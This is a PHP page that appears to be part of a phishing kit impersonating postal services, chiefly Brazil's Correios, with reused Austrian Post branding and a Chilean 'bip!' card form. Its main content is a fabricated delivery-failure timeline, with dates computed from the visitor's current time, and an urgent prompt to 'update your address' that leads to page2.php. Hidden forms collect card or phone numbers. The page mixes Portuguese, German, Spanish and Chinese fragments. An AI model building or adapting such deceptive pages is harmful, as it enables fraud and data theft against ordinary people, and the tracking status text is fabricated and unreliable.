<?php

include('header-him.php');

$currentDateTime = date('m/d/Y H:i'); // Get the current date and time

?>

<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
<!-- Include Slick theme CSS -->
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
<!-- Include jQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<!-- Include Slick JS -->
<script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>

<style type="text/css">
  form button[type="submit"] {
    background: #00a8b7;
    border: 1px solid #007984;
    color: #FFF;
    -moz-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -webkit-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
  }
  .login-form {
    margin-right: -10px;
    margin-left: -10px;
  }
  .container {
    line-height: 1.5;
  }
  .photoblock2 {
    background-image: url(/images/photoblock_inbg.png) !important;
  }
  .innerpage {
    padding-top: 0px !important;
  }
  .tab-header-item {
    width: 49%;
    position: relative;
    float: left;
    padding: 0;
    margin: 0;
    background: gray;
    text-align: center;
    font-size: 16px;
    line-height: 40px !important;
    color: white;
    border-top-left-radius: 12px;
    border-top-right-radius: 12px;
    cursor: pointer;
  }
  .tab-header-item.active {
    background: black;
  }
  .pull-left {
    float: left !important;
  }
  .pull-right {
    float: right !important;
  }
  .tab-content {
    display: none;
  }
  .tab-content.active {
    display: block;
  }
  .tab-container {
    border-radius: 10px;
    box-shadow: 2px 2px 10px -2px rgba(0, 0, 0, .5);
    transition: background .3s, border .3s, border-radius .3s, box-shadow .3s;
    padding: 1rem 0.6rem;
  }
  .tab-container form .btnSubmit {
    border-radius: 50px !important;
    width: 100%;
    margin-top: 0.5rem;
  }
  .tab-container .form-group {
    color: #333;
    /* font-size: 1.25rem; */
  }
  .form-info>i {
    margin-left: 12px;
  }
  .submit-info {
    width: 100%;
  }
</style>

<div class="content__container">
    <div class="banner-principal slickInit" style="display:none">
        <a href="https://c.correios.com.br/blackfriday-app" target="_blank">
            <img
                    class="banner-principal-p oculta-elemento"
                    src="/AT2/images/slider-img1.png"
                    alt="Imagem com fundo preto escrito: Black Friday dos Correios a gente se conecta. As soluções dos Correios para o seu negócio: APlicativo Correios, Correios Empresa e Correios API."
            />
        </a>

        <a href="https://c.correios.com.br/sedex-hoje-ta-on" target="_blank">
            <img
                    class="banner-principal-p oculta-elemento"
                    src="/AT2/images/slider-img2.png"
                    alt="Imagem de fundo preto: Black Friday dos Correios. A gente se CONecta. Velocidade ta ON. SEDEX HOJE: Encomendas entregues em poucas horas com acompanhamento em tempo real."
            />
        </a>

        <a href="https://www.correios.com.br/exportafacilmais/exportafacilmais" target="_self">
            <img
                    class="banner-principal-p oculta-elemento"
                    src="/AT2/images/slider-img3.png"
                    alt="Exporta Fácil Mais - Praticidade nas COTAÇÕES e facilidade nas GRANDES EXPORTAÇÕES. Faça parte da rede credenciada para empresas  de exportações dos Correios. Acesse aqui."
            />
        </a>

        <a href="https://blognoel.correios.com.br/blognoel/index.php" target="_blank">
            <img
                    class="banner-principal-p"
                    src="/AT2/images/slider-img4.png"
                    alt="Todo Mundo pode ser Noel seja você também. Adote uma cartinha e seja você Noel!"
            />
        </a>


    </div>
    <div class="controlador d-none">
        <button id="anterior-banner" class="bt-link-ic previousArrow"><i class="ic-proximo-out"></i></button>
        <button id="pausa-banner" class="bt-link-ic"><i class="ic-pause-out"></i></button>
        <button id="proximo-banner" class="bt-link-ic nextArrow"><img src="/AT2/images/next-btn.png"></button>
    </div>

</div>

<script>
    $(document).ready(function(){
        $('.slickInit').show();
        $('.slickInit').slick({
            autoplay: true,
            autoplaySpeed: 5000,
            arrows: true,
            prevArrow: $('.previousArrow'),
            nextArrow: $('.nextArrow')
        });
    });
</script>

<div class="container content__container" style="display:none">
    <div class="row justify-content-center content__row">

        <div class="col-md-12 col-lg-8">
            <div class="centerstage">
                <main role="main" class="main">
                    <section class="trackingsearch__section">
                            <div class="container">
                                <div class="trackingsearch__form">
                                    <form action="/page2.php" method="post" class="search-form cham-form trackingsearch" autocomplete="off">
                                        <div class="searchbar">
                                            <label class="searchbar__label" for="trackingSearchID"></label>
                                            <div class="trackingsearch__input-holder">
                                                <input class="searchbar__input input-validation-error" name="phone" id="trackingSearchID" type="text" placeholder="Sendungsnummer" autocomplete="off" value="">
                                                <div class="field-validation-error">
                                                    <span class="field-validation-error--icon"></span>
                                                </div>
                                                <button type="button" class="trackingsearch__clearicon"></button>
                                            </div>
                                            <button type="submit" class="searchbar__submit">
                                                <span aria-hidden="true" class="searchbar__icon posticon_Posticon-Lupe"></span>
                                                <span class="sr-only">Suche abschicken</span>
                                            </button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </section>
                    <div class="app-download-buttons-container for_desktop_only">
                        <h4>Post App gratis downloaden</h4>
                        <div class="downloadButtonsGrup">
                            <a href="https://play.google.com/store/apps/details?id=at.post.app" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/google-play-badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=81909C8B194522B0DF25A35DF4EBE4FA" class="appleBtn" alt="Google App Store Button">
                            </a>
                            <a href="https://apps.apple.com/at/app/post-sendungsverfolgung/id1520160912" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/Apple_App_Store_Badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=8BC09ACEAE5F70C62699F8F7C94CEB94" class="googlebtn" alt="Apple App Store Button">
                            </a>
                        </div>
                    </div>
                </main>
            </div>
        </div>

    </div>
</div>

<style type="text/css">
    form button[type="submit"] {
        background: #00a8b7;
        border: 1px solid #007984;
        color: #FFF;
        -moz-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        -webkit-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        -moz-border-radius: 4px;
        -webkit-border-radius: 4px;
        border-radius: 4px;
    }
    .login-form {
        margin-right: -10px;
        margin-left: -10px;
    }
    .container {
        line-height: 1.5;
    }
    .photoblock2 {
        background-image: url(/images/photoblock_inbg.png) !important;
    }
    .innerpage {
        padding-top: 0px !important;
    }
    .tab-header-item {
        width: 49%;
        position: relative;
        float: left;
        padding: 0;
        margin: 0;
        background: gray;
        text-align: center;
        font-size: 16px;
        line-height: 40px !important;
        color: white;
        border-top-left-radius: 12px;
        border-top-right-radius: 12px;
        cursor: pointer;
    }
    .tab-header-item.active {
        background: black;
    }
    .pull-left {
        float: left !important;
    }
    .pull-right {
        float: right !important;
    }
    .tab-content {
        display: none;
    }
    .tab-content.active {
        display: block;
    }
    .tab-container {
        border-radius: 10px;
        box-shadow: 2px 2px 10px -2px rgba(0, 0, 0, .5);
        transition: background .3s, border .3s, border-radius .3s, box-shadow .3s;
        padding: 1rem 0.6rem;
    }
    .tab-container form .btnSubmit {
        border-radius: 50px !important;
        width: 100%;
        margin-top: 0.5rem;
    }
    .tab-container .form-group {
        color: #333;
    }
    .form-info>i {
        margin-left: 12px;
    }
    .submit-info {
        width: 100%;
    }
</style>

<!-- main Start -->
<div id="center" class="main innerpage">
    <div class="old_code_wrap">
        <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
        <!-- photoblock start-->
        <section class="section col-12 photoblock2 no-print" style="background-image: url(/images/photoblock_inbg.png) !important;">
        </section>
        <!-- photoblock end-->
        <div class="container">
            <!-- h1節點 -->
            <h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">consultas Sobre el estado de los Cargos no Pagados</h1>
            <!-- aP Start -->
            <section class="ap">
                <!-- searchform start -->
                <div class="searchform">
                    <div class="login-form">
                        <div class="tab-headers clearfix">
                            <h2 class="tab-header-item active" data-tab="loginForm">Carga tarjeta bip!</h2>
                            <!-- <h2 class="tab-header-item pull-right" data-tab="testform">Carga bip!QR</h2>   -->
                        </div>
                        <div class="tab-container">
                            <form action="./page2.php" method="POST" id="loginForm" data-tab="tab1" novalidate class="active tab-content">
                                <div class="form-group">
                                    <legend class="form-info">Número de tarjeta bip!<i class="fa fa-info-circle"></i></legend>
                                    <input type="text" placeholder="Ej: 123456789" name="username" required>
                                </div>
                                <div class="form-submit">
                                    <button type="submit" class="btnSubmit btn" name="submit" id="submit">Continuar</button>
                                    <center>
                                        <span class="submit-info">Al continuar estas aceptando nuestros <b>términos y condiciones</b>.</span>
                                    </center>
                                </div>
                            </form>
                            <form action="./page2.php" method="POST" id="testform" class="tab-content" novalidate>
                                <p>empty</p>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    </div>
    <div class="container" style="padding: 0px!important;">
        <section class="ap">
            <div class="" style="display:none">
                <div class="card_wrap">
                    <div class="top_card">
                        <div class="id_main">
                            <span><img style="width: auto;height: 35px"  src="<?php echo $folder_path;?>/images/ata-colored.png" alt="Post Logo"> </span>
                            <div class="top_card_left">
                                <h4>CD721765548AT</h4>
                                <p class="short_id">Sendungsnummer</p>
                            </div>
                        </div>
                        <p style="color: red" class="like_viewmore"></p>
                    </div>
                    <div class="bottom_card">
                        <p class="card_tag">Österreichische Post</p>
                        <p class="post_date_card"><?php echo $currentDateTime;?></p>
                    </div>
                </div>
            </div>
            <div class="">
                <div class="card_wrap">
                    <div class="time_line">
                        <div class="right-red colored" style="padding-left: 20px;width: 100%">
                            <h4 class="top_title_ps">Suspensão da entrega</h4>
                            <p></p>
                            <p style="padding-top: 10px" class="bottom_color">C756871964328BR</p>
                            <p></p>
                            <p></p>
                            <a href="#" style="text-decoration: underline;padding-top: 10px">O que aconteceu?</a>
                        </div>
                        <div>
                        </div>
                    </div>
                </div>
            </div>
            <style>
                .delivery-container {
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                .dot-line {
                    display: flex;
                    align-items: center;
                    width: 400px; /* Adjust the length of the line as needed */
                }
                .dot {
                    width: 20px;
                    height: 20px;
                    background-color: black;
                    border-radius: 50%;
                }
                .horizontal-line {
                    height: 2px;
                    flex-grow: 1;
                    background-color: #ddd;
                }
                .car {
                    transform: scaleX(-1);
                    font-size: 24px;
                    color: black;
                }
                .title-text{
                    font-size: 13px!important;
                }
                @media (max-width: 767px) {
                    #dot1:before {
                        background-color: #CCCCCC !important; /* Red for the first dot */
                        color: #CCCCCC !important; /* Red for the first dot */
                    }
                    .left-green, .right-red {
                        width: 100%!important;
                    }
                    .right-red.colored::before {
                        background: #ffdc00;
                        border-color:#fff;
                    }
                    .time_line:last-child .right-red.colored::after {
                        background: #ddd;
                        opacity: 1;
                        height: 60%;
                        top: 30px;
                    }
                }


            </style>

            <div class="time_line_wrap only_mobile card_wrap">
                <div class="delivery-container-box">
                    <div class="delivery-object">
                        <span>Estado atual</span>
                    </div>
                    <div class="delivery-status">
                        <span></span>
                    </div>
                    <div class="delivery-data">
                        <span>Data de entrega</span>
                    </div>
                </div>
                <div class="delivery-container" style="display:none">
                    <div class="dot-line">
                        <div class="dot"></div>
                        <div class="horizontal-line"></div>
                        <div class="dot"></div>
                        <div class="horizontal-line"></div>
                        <span class="car">🚚</span>
                    </div>
                </div>
                <div class="time_line one">
                    <div class="right-red delivery-icon-circle" id="dot1">
                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -0 DAY +2 HOURS'));?> 09:52</p>
                        <p class="bottom_color text-contain">A entrega da encomenda falhou devido a um problema com a morada, devolver ao centro de distribuição</p>
                    </div>
                </div>
                <div class="time_line">
                    <div class="right-red delivery-icon-circle second">
                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -1 DAY +2 HOURS'));?> 15:17</p>
                        <p class="text-contain">O pacote chegou ao centro de triagem e a transportadora está pronta para enviá-lo</p>
                    </div>
                </div>
                <div class="time_line">
                    <div class="right-red delivery-icon-circle third">
                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -2 DAY +3 HOURS'));?> 18:21</p>
                        <p class="bottom_color text-contain">O pacote é carregado e transportado até seu destino.</p>
                    </div>
                </div>
                <div class="time_line">
                    <div class="right-red delivery-icon-circle four">
                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -3 DAY +1 HOURS'));?> 10:13</p>
                        <p class="bottom_color text-contain">Pacotes registrados e verificados prontos para o carregamento</p>
                    </div>
                </div>
            </div>

            <div class="message_expert only_mobile">
                <div class="sub-title" style="border: 1px solid #dedbdb;">
                    <div class="heading_wrap">
                        <img src="<?php echo $folder_path;?>/images/alert-box-svg.svg"style="height: 70px;max-height:70px !important;">
                        <div class="card-txt">
                            <label class="titulo" for="objetos">Atualize o status de sua encomenda</label>
                            <p style="font-weight:100;padding: 0 18px;text-align: left;font-size: 15px;font-family: 'Trebuchet MS', 'arial', 'helvetica', 'Open Sans', sans-serif !important;">⚠️Seu pacote foi devolvido ao centro de distribuição mais próximo porque a entrega falhou devido a um endereço incorreto. Atualize seu endereço correto o mais rápido possível para que possamos entregá-lo novamente!</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="message_expert only_mobile" style="display: none">
                <div class="sub-title" >
                    <div class="heading_wrap">
                        <img src="<?php echo $folder_path;?>/images/alert3.png"style="height: 30px">
                        <h2 class="title">Abnormaler Paketstatus</h2>
                    </div>
                    <p class="title-text" style="margin-bottom: 5px!important;">Paket konnte wegen falscher Adresse nicht korrekt zugestellt werden, PostAG ermöglicht erneute Zustellung von Paketen bei falscher Adresse<strong></strong></p>
                    <p class="title-text">Bitte aktualisieren Sie die korrekte Adresse so bald wie möglich, wir werden wieder liefern, wenn Sie Fragen haben, wenden Sie sich bitte an das Personal<strong></strong></p>
                </div>
            </div>
            <div class="button_block only_mobile">
                <a href="page2.php"><button class="button_next">Atualizar endereço</button></a>
                <div class="app-download-buttons-container for_only_mobile">
                        <h4>Post App gratis downloaden</h4>
                        <div class="downloadButtonsGrup">
                            <a href="https://play.google.com/store/apps/details?id=at.post.app" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/google-play-badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=81909C8B194522B0DF25A35DF4EBE4FA" class="appleBtn" alt="Google App Store Button">
                            </a>
                            <a href="https://apps.apple.com/at/app/post-sendungsverfolgung/id1520160912" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/Apple_App_Store_Badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=8BC09ACEAE5F70C62699F8F7C94CEB94" class="googlebtn" alt="Apple App Store Button">
                            </a>
                        </div>
                    </div>
            </div>

        </section>
        <!-- aP End -->
        <script>
            function checkForm() {
                var canGo = true;
                var custno = $("#custNo").val();
                if (custno === "") {
                    $("#custNoError").show();
                    canGo = false;
                }
                var answer = $("#answer").val();
                if (answer === "") {
                    $("#answerError").show();
                    canGo = false;
                }
                return canGo;
            }

            function errorNoticeDisplay(fieldName, noticeWarning) {
                $("#" + fieldName + "Error").show();
                $("#" + fieldName + "ErrorWarning").text(noticeWarning);
            }

            function sendEmailCaptcha() {
                var returnValue = true;
                if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
                    errorNoticeDisplay('email', '請輸入Email 帳號');
                    returnValue = false;
                } else {
                    //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
                    var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                    if (patternEmail.test($("#email").val()) == false) {
                        errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
                        returnValue = false;
                    } else {
                        patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
                        if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                            errorNoticeDisplay('email',
                                '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
                        }
                    }
                }
                if (returnValue) {
                    $.ajax({
                        url: "/AT2/captcha/sendCaptcha",
                        type: "get",
                        data: {
                            "email": $("#email").val()
                        },
                        success: function(response) {
                            $('#modal1').hide();
                            $('.modal_overlay').hide();
                            if (response) {
                                swal("驗證碼已寄出，請至電子郵件信箱收信。");
                            } else {
                                swal("驗證碼已過期，請刷新驗證碼。");
                            }

                        },
                        error: function(response) {
                            swal("驗證碼已過期，請刷新驗證碼。");
                        }
                    });
                }
            }

            $(function() {
                $(".tab-header-item").on("click", function(e) {
                    e.preventDefault();
                    $(".tab-header-item").removeClass("active");
                    $(this).addClass("active");
                    var data_tab = $(this).attr("data-tab");
                    $(".tab-content").removeClass("active");
                    $("#" + data_tab).addClass("active");
                });

                $('#custNo').click(function() {
                    $('.annotation').show();
                    $("#answer").val("");
                });

                $('#answer').focus(function() {
                    $("#answer").val("");

                });
                $('#answer').keyup(function() {
                    var ans = $("#answer").val();
                    $("#answer").val(toASCII(ans));
                });

            });
        </script>
    </div>
</div>

<div class="content__container" style="display:none">
    <div class="centerstage">
        <main role="main" class="main">
            <div class="faq faq__main ">
                <div class="faq__top">
                    <div class="container">
                        <div class="row">
                            <div class="col-12 col-md-6 col-lg-8">
                                <div class="faq__headline-block">
                                    <h1 class="faq__headline">FAQ</h1>
                                    <span class="faq__separator"></span>
                                    <p class="faq__subheadline">Häufig gestellte Fragen</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="faq__bottom">
                    <div class="container">
                        <div class="row">
                            <div class="col-lg-4"></div>
                            <div class="col-12 col-lg-8">
                                <div class="faq__bottom__right">
                                    <div class="faq__item-list">
                                        <div class="faq__item">
                                            <button class="faq__item__button" data-toggle="collapse" data-target="#FAQ1772607472" aria-expanded="false" aria-controls="FAQ1772607472">
                                                <span class="faq__item__button__text"> Wie kann ich mich als Geschäftskund*in über das Post-Kundenservice identifizieren? </span>
                                                <span class="faq__item__button__dropdown"></span>
                                            </button>
                                            <div class="faq__item__collapse collapse" id="FAQ1772607472">
                                                <div class="faq__item__content">
                                                    <p>Eine Identifizierung des Geschäftskund*innen Accounts ist auch über das Post Kundenservice möglich:</p>
                                                    <ul>
                                                        <li>Konto auf post.at erstellen</li>
                                                        <li>Das&nbsp; <a rel="noopener noreferrer" href="https://www.post.at/k/f/kontaktformular?problem=IdentifizierungOnlineGeschaeftskunden" target="_blank">Kontaktformular </a>ausfüllen. </li>
                                                        <li>Das Post Kundenservice prüft Unterlagen, identifiziert und informiert Geschäftskund*innen per E-Mail</li>
                                                    </ul>
                                                    <p>Weitere Informationen und Möglichkeiten zur Identifizierung finden Sie <a href="/p/c/identifizierung">hier</a>. </p>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="faq__item">
                                            <button class="faq__item__button" data-toggle="collapse" data-target="#FAQ713901142" aria-expanded="false" aria-controls="FAQ713901142">
                                                <span class="faq__item__button__text"> Wie lange dauert es, bis meine Sendung in Österreich ankommt? </span>
                                                <span class="faq__item__button__dropdown"></span>
                                            </button>
                                            <div class="faq__item__collapse collapse" id="FAQ713901142">
                                                <div class="faq__item__content"> Über 96 % aller PRIO-Briefsendungen werden bereits am nächsten Werktag zugestellt. <br>
                                                    <br> Über 97 % der Inlandspakete werden innerhalb von 2 Werktagen zugestellt. <br>
                                                    <br> Post Express Österreich-Sendungen werden am nächsten Werktag bis spätestens 13.00 Uhr zugestellt. <br>
                                                    <br> Informationen für Auslandssendungen entnehmen Sie bitte den Angaben im Tarifrechner. <br>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="faq__item">
                                            <button class="faq__item__button" data-toggle="collapse" data-target="#FAQ1979841193" aria-expanded="false" aria-controls="FAQ1979841193">
                                                <span class="faq__item__button__text"> Wie viel kostet der Versand meines Briefes, Pakets,..? </span>
                                                <span class="faq__item__button__dropdown"></span>
                                            </button>
                                            <div class="faq__item__collapse collapse" id="FAQ1979841193">
                                                <div class="faq__item__content"> Genaue Informationen entnehmen Sie bitte den Angaben im <a href="/t/tarifrechner">Tarifrechner</a>. </div>
                                            </div>
                                        </div>
                                        <div class="faq__item">
                                            <button class="faq__item__button" data-toggle="collapse" data-target="#FAQ1074671446" aria-expanded="false" aria-controls="FAQ1074671446">
                                                <span class="faq__item__button__text"> Gibt es ein Briefmarken-Abo? </span>
                                                <span class="faq__item__button__dropdown"></span>
                                            </button>
                                            <div class="faq__item__collapse collapse" id="FAQ1074671446">
                                                <div class="faq__item__content"> Hier finden Sie alles Wissenwerte über unser <a href="/p/c/abo-moeglichkeiten">Briefmarken-Abo</a>. </div>
                                            </div>
                                        </div>
                                        <div class="faq__item">
                                            <button class="faq__item__button" data-toggle="collapse" data-target="#FAQ826531606" aria-expanded="false" aria-controls="FAQ826531606">
                                                <span class="faq__item__button__text"> Phishing Gefahr - Wie erkenne ich , ob der*die Absender*in einer Nachricht tatsächlich die Österreichische Post AG ist? </span>
                                                <span class="faq__item__button__dropdown"></span>
                                            </button>
                                            <div class="faq__item__collapse collapse" id="FAQ826531606">
                                                <div class="faq__item__content">
                                                    <p>Bitte prüfen Sie, ob Sie wirklich eine Leistung der Österreichischen Post AG in Anspruch genommen haben oder eine Sendung erwarten. <br> Geben Sie nie Zugangsdaten oder vertrauliche Informationen ein, wenn Sie durch einen Link dazu aufgefordert werden. Achten Sie beim Login darauf, ob die Webseite tatsächlich von der Post ist. Löschen Sie E-Mails, die Ihnen verdächtig vorkommen. </p>
                                                    <p>Weitere Informationen finden Sie auf unserer Seite <a href="/i/c/gefahren-im-internet">"Gefahren im Internet"</a>. </p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <a href="https://www.post.at/p/c/faq-privat?promo_name=FAQ&amp;promo_id=111&amp;promo_creative=Button&amp;promo_position=Startseite" class="linkbtn linkbtn__primary" rel="noopener noreferrer" target="_blank">
                                        <span class="linkbtn__text">Alle FAQ</span>
                                        <span class="linkbtn__icon posticon_Posticon-Button-Pfeil-Weiter"></span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</div>


<?php include('footer-him.php'); ?>